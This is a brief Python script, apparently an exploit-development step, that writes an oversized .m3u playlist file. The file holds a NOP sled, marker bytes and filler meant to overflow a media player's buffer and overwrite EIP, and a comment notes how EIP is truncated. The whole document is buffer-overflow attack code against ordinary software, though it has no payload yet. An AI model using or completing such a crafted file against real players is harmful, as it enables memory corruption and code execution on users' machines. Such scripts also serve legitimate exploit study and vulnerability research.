buffer = "\x90"*536 + "B"*2 +"C"*2 + "X" * 2864
#trucates EIP from 43 to 4F
f = open('file3.m3u','w')
f.write(buffer)
f.close()
